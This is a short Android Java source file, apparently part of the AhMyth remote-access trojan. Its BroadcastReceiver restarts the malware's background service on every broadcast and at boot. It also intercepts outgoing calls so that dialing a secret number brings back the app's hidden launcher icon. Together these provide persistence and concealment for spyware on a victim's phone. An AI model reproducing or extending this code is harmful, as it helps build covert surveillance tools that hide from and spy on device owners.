package ahmyth.mine.king.ahmyth;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import androidx.core.content.ContextCompat;
import android.widget.Toast;

public class MyReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        // Siempre intenta iniciar el servicio principal
        MainService.startService(context);

        // Acción: Dispositivo encendido
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            MainService.startService(context);
        }

        // Acción: Llamada saliente
        if (Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction())) {
            String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

            if (phoneNumber != null &&
                phoneNumber.equals(context.getResources().getString(R.string.unhide_phone_number))) {

                SharedPreferences sharedPreferences = context.getSharedPreferences("AppSettings", Context.MODE_PRIVATE);
                boolean hidden_status = sharedPreferences.getBoolean("hidden_status", false);

                if (hidden_status) {
                    SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();
                    appSettingEditor.putBoolean("hidden_status", false);
                    appSettingEditor.apply();

                    ComponentName componentName = new ComponentName(context, MainActivity.class);
                    context.getPackageManager()
                           .setComponentEnabledSetting(componentName,
                               PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                               PackageManager.DONT_KILL_APP);

                    Toast.makeText(context, "AhMyth's icon has been revealed!", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }
}